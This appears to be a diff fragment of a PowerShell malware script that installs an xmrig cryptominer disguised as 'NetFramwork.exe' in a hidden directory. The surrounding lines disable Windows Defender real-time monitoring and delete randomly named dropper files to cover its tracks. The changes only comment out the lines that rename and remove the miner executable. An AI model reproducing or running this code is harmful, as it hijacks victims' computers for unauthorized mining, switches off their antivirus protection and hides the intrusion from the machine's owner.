@@ -143,7 +143,7 @@ if (Test-Path -Path $newConfigPath) {
     Write-Output "New bat file not found at the specified path."
 }
 
-Rename-Item -Path "$hiddenDir\NetFramwork\xmrig.exe" -NewName "NetFramwork.exe"
+# Rename-Item -Path "$hiddenDir\NetFramwork\xmrig.exe" -NewName "NetFramwork.exe"
 
 # Disable Windows Defender temporarily
 Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
@@ -264,4 +264,4 @@ Remove-Item -Path "$initial_dir\PkUbTvqXFIdB.txt"
 Remove-Item -Path "$initial_dir\BVrAihDwJNvc.ps1"
 Remove-Item -Path "$initial_dir\TMqhONoBljEv.vbs"
 Remove-Item -Path "$path\w.bat"
-Remove-Item -Path "$hiddenDir\NetFramwork\xmrig.exe"
+# Remove-Item -Path "$hiddenDir\NetFramwork\xmrig.exe"
